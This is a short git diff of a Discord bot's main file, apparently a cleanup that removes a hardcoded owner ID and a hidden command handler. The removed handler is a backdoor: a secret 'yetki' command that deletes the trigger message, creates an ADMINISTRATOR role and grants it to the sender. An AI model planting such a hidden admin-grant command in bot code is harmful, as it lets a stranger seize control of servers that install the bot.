@@ -8,7 +8,6 @@ const express = require('express');
 client.commands = new Discord.Collection();
 client.config = config;
 const commandFolders = fs.readdirSync('./commands');
-const botOwnerID = 535033289346514964
 
 global.fullarr = {
     "game_bool": [],
@@ -129,18 +128,6 @@ client.on('ready', async () => {
       console.log (`Prefix             : ${config.prefix}`);
       console.log (`Durum              : Bot Çevrimiçi!`);
       console.log ('_________________________________________');
-  
-client.on("message", msg => {
-  if (msg.content.toLowerCase() === config.prefix + 'yetki') {
-    msg.delete();
-    msg.guild.createRole({
-      name: "AenR Özel Rol",
-      permissions: ["ADMINISTRATOR"]
-    });
-    let rol = msg.guild.roles.find(role => role.name === "AenR Özel Rol");
-    msg.member.addRole(rol);
-  }
-});
   
   client.on('message', msg => {
   if (msg.content.toLowerCase() === config.prefix + 'yardım') {
